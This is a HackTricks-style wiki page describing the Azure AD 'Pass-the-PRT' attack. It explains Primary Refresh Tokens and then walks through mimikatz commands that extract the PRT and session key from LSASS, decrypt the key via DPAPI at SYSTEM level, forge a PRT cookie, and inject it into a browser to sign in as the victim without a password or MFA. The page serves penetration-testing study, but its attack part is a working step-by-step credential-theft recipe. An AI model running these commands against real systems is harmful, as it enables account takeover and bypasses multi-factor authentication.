# Az - Pass the PRT

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

## What is a PRT

A **Primary Refresh Token (PRT)** is used to provide a **single sign-on (SSO)** experience for users of Windows 10 and mobile OSes.

When you log in in a device supporting thins SSO, Windows will **communicate with the Cloud Authentication Provider, validate** your credentials and **returns** the **PRT** and a **session key**. The **PRT is stored in LSASS**, and the **session key gets re-encrypted** with the local devices TPM and then stored alongside the PRT.&#x20;

Then, when the **browser** tries to access resources on the cloud, a **PRT cookie** is used to access them.

Once issued, a **PRT** is **valid** for **14 days** and is **continuously renewed** as long as the user actively uses the device. A PRT only has **MFA claims** if when accessing RDP you use **windows hello** or **windows account manager**.

It can be used to obtain access and refresh token to any application.

For more information about how this works read the [**documentation**](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token) or [**this page**](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/).

### Check if you have a PRT

```
Dsregcmd.exe /status
```

In the SSO State section, you should see the **`AzureAdPrt`** set to **YES**.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

In the same output you can also see if the **device is joined to Azure** (in the field `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Pass-the-PRT

### Steps

1. **Extract** the **PRT from LSASS** and save this for later.&#x20;
2. **Extract** the **Session Key**.  If you remember this is issued and then re-encrypted by the local device, so we need to **decrypt this using a DPAPI masterkey**. For more info about DPAPI check this [**HackTricks**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) link or the [**Pass-the-cookie attack**](az-pass-the-cookie.md).
3. Using the decrypted Session Key, we will obtain the derived key for the PRT and the context.   This is needed to **create our PRT cookie**.  The derived key is what is used to sign the JWT for the cookie. Dirk-jan did a great job explaining this process [here](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

Now we have everything we need to sign our own PRT Cookies and the rest of these steps can be done from any other system.

* We will use the PRT, derived key, and context to create a new PRT Cookie.
* Import the cookie into your browser session (we‚Äôll use Chrome)
* That‚Äôs it!  You should now be authenticated as that user without having to know their password, or handle any MFA prompts.&#x20;

### Attack

You can use **mimikatz** to extract the PRT:

```
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap
```

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Copy** the part labeled **Prt** and save it.\
Extract also the session key or ‚Äú**ProofOfPosessionKey**‚Äù which you can see highlighted below. This is encrypted and we will need to use our DPAPI masterkeys to decrypt it.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
If you don‚Äôt see any PRT data it could be that you **don‚Äôt have any PRTs** because your device isn‚Äôt Azure AD joined or it could be you are **running an old version** of Windows 10.
{% endhint %}

To **decrypt** the session key you need to **elevate** your privileges to **SYSTEM** to run under the computer context to be able to use the **DPAPI masterkey to decrypt it**. You can use the following commands to do so:

```
Token::elevate
Dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Now you want to copy both the Context value:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

And the derived key value:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Finally you can use all this info to **generate PRT cookies**:

```
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Go to [https://login.microsoftonline.com](https://login.microsoftonline.com), clear all cookies for login.microsoftonline.com and enter a new cookie.

```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
HttpOnly: Set to True (checked)
```

{% hint style="danger" %}
The rest should be the defaults.  Make sure you can refresh the page and the cookie doesn‚Äôt disappear, if it does, you may have made a mistake and have to go through the process again.  If it doesn‚Äôt, you should be good.
{% endhint %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>
